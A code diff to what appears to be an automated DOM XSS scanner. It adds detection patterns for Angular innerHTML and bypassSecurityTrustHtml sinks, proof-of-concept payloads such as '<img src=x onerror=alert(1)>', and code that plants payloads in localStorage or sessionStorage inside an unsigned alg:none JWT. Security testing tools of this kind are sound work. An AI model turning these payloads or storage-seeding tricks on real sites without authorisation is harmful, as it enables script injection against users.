@@ -16,6 +16,8 @@ Two jobs:
 
 from __future__ import annotations
 
+import base64
+import json
 import re
 from typing import Any, Dict, List, Optional, Tuple
 from urllib.parse import quote, urlparse
@@ -121,6 +123,16 @@ _SINK_PATTERNS: List[Tuple[str, str, str]] = [
     (r"\.on\w+\s*=", "inline_handler_assign", "html"),
     (r"\bsetAttribute\s*\(\s*['\"]on", "setAttribute_on", "html"),
     (r"\bFunction\s*\(", "Function_ctor", "code"),
+    # AOT-compiled Angular never assigns ``innerHTML``: the template compiler
+    # emits ``ɵɵproperty("innerHTML", value, …)`` (minified to ``ny(`innerHTML`,
+    # value, …)``), so the property name is an *argument* and the assignment
+    # form above cannot see it. This is the sink behind every
+    # ``[innerHTML]`` binding.
+    (r"[A-Za-z_$][\w$]*\s*\(\s*['\"`]innerHTML['\"`]\s*,", "innerHTML", "html"),
+    # ``bypassSecurityTrustHtml`` in the same expression is Angular's explicit
+    # announcement that the value was *not* sanitised, which is what turns a
+    # ``[innerHTML]`` binding from inert into executable.
+    (r"bypassSecurityTrustHtml\s*\(\s*`[^`]*\$\{[^}]+\}", "innerHTML", "html"),
 ]
 
 _HTML_SINKS = {"jquery.html", "jquery.append", "jquery.prepend", "innerHTML",
@@ -888,6 +900,21 @@ def analyze_dom_sources_sinks(html: str) -> List[Tuple[str, str]]:
 # ----------------------------------------------------------------------
 
 
+def _reaches_trusted_html(js: str, sink: str) -> bool:
+    """Whether the analysed value is interpolated into trusted markup.
+
+    A ``[innerHTML]`` binding compiled by Angular is ``sink("innerHTML", v)``
+    where ``v`` is usually a *sanitised* ``SafeValue``. When the page instead
+    calls ``bypassSecurityTrustHtml(`<small>${v}</small>`)`` the same sink
+    receives a string the framework was explicitly told to trust, and the
+    fragment sits inside that string as text — not inside an attribute the
+    page wraps around it. Only then is bare markup sufficient.
+    """
+    if sink != "innerHTML":
+        return False
+    return bool(re.search(r"bypassSecurityTrustHtml\s*\(\s*`[^`]*\$\{", js))
+
+
 def _payload_candidates(
     family: str, sink: str, js: str = "", source: str = ""
 ) -> List[Tuple[str, str]]:
@@ -1028,6 +1055,28 @@ def _payload_candidates(
                 ("alert(1)", "fallback: evaluated as bare code"),
             ]
         return [("alert(1)", "fragment is evaluated as code by the sink")]
+    if family == "html" and _reaches_trusted_html(js, sink):
+        # The value is interpolated into a trusted HTML string that the page
+        # itself hands to a sinking property. Nothing wraps it: the sink parses
+        # the outcome as markup, so plain tags are live and a quote breakout
+        # would only add literal characters to a text node.
+        return [
+            (
+                "<img src=x onerror=alert(1)>",
+                "the source is interpolated into a string passed to a trusted-HTML "
+                "sink; the fragment is parsed as markup with no surrounding "
+                "attribute to escape",
+            ),
+            (
+                "<svg onload=alert(1)>",
+                "same position with a self-firing SVG element, for pages that "
+                "sanitise <img>",
+            ),
+            (
+                "<details open ontoggle=alert(1)>",
+                "third element family, for pages that allow neither <img> nor <svg>",
+            ),
+        ]
     # html family: the page builds an element from a single-quoted attribute
     # (``<img src='FRAGMENT'>``). Breaking the quote alone is not enough: the
     # handler that would carry our code never gets a firing event, so the
@@ -1216,23 +1265,85 @@ def source_seed(
         return {"window_name": payload}
     if source in ("document.cookie", "cookie"):
         return {"cookies": [("badValue", payload), ("payload", payload)]}
+    if source.startswith("localStorage"):
+        # The page reads a named key out of the store, so the seed is written
+        # under that key. The orchestrator replaces it per candidate payload.
+        return {"storage": {_store_key(source, "localStorage"): _store_value(payload)}}
+    if source.startswith("sessionStorage"):
+        return {"session_storage": {_store_key(source, "sessionStorage"): _store_value(payload)}}
     return {}
 
 
-def dom_source_finding(url: str, html: str, marker: str = "") -> Optional[XSSFinding]:
+# A store read is rarely consumed raw: an SPA keeps a *token* there and hands
+# the decoded body to the sink. Planting the bare payload makes ``JSON.parse``
+# throw before anything renders, so the value has to survive the decoding the
+# page performs — a three-segment JWT whose payload carries the fragment.
+_JWT_LIKE = "%s.%s.%s"
+
+
+def _b64url(text: str) -> str:
+    return base64.urlsafe_b64encode(text.encode()).decode().rstrip("=")
+
+
+def _store_value(payload: str) -> str:
+    """A stored value shaped like what the page parses, not the bare payload."""
+    header = _b64url('{"alg":"none","typ":"JWT"}')
+    body = _b64url(
+        json.dumps(
+            {
+                "data": {
+                    "lastLoginIp": payload,
+                    "ip": payload,
+                    "name": payload,
+                    "email": payload,
+                    "username": payload,
+                },
+                "exp": 4102444800,
+            }
+        )
+    )
+    return _JWT_LIKE % (header, body, "")
+
+
+def _store_key(source: str, store: str) -> str:
+    """The key a storage source reads, defaulting to the payload's own name.
+
+    ``localStorage.getItem('token')`` names its key explicitly. When the key is
+    computed (``getItem(name)``) the source carries no literal, and a page using
+    it reads whatever the application wrote there — "token" is the value every
+    modern SPA router looks for, and a seed under any other name would never be
+    consulted.
+    """
+    m = re.search(
+        r"%s(?:\.getItem|\.setItem)?\s*[\(\[]\s*['\"]([^'\"]+)['\"]" % store, source
+    )
+    return m.group(1) if m else "token"
+
+
+def dom_source_finding(
+    url: str, html: str, marker: str = "", external_js: Optional[List[str]] = None
+) -> Optional[XSSFinding]:
     """DOM XSS where the source is a browser-owned value, not a URL parameter.
 
     ``location.hash`` / ``location.search`` findings are handled by
     :func:`fragment_dom_finding`; this covers ``document.referrer``,
-    ``window.name`` and cookie reads that reach an execution sink. The finding
-    carries the seed the orchestrator must plant in the browser to prove it.
+    ``window.name``, cookie reads and client-side store reads
+    (``localStorage`` / ``sessionStorage``) that reach an execution sink. The
+    finding carries the seed the orchestrator must plant in the browser to
+    prove it.
+
+    *external_js* carries the bodies of the page's own ``<script src=…>``
+    files. A component whose sink only exists in a bundle is unreachable from
+    the document alone.
     """
-    flows = analyze_dom_flows(html)
+    flows = analyze_dom_flows(html, external_js)
     # Only flows no URL can drive: otherwise fragment analysis owns the case.
     seedable = {
         "document.referrer",
         "window.name",
         "document.cookie",
+        "localStorage",
+        "sessionStorage",
     }
     candidates_flows = [f for f in flows if f[0] in seedable]
     if not candidates_flows:
@@ -1248,10 +1359,10 @@ def dom_source_finding(url: str, html: str, marker: str = "") -> Optional[XSSFin
         return (0 if via_url else 1, {"code": 3, "html": 2, "src": 1}.get(family, 0))
 
     source, sink, family = max(candidates_flows, key=_rank)
-    js = "\n".join(_scripts(html))
+    js = "\n".join(_scripts(html, external_js))
     candidates = [
         (_mark_payload(p, marker), why)
-        for p, why in _payload_candidates(family, sink, js)
+        for p, why in _payload_candidates(family, sink, js, source)
     ]
     payload, rationale = candidates[0]
     seeds = source_seed(source, payload, url)
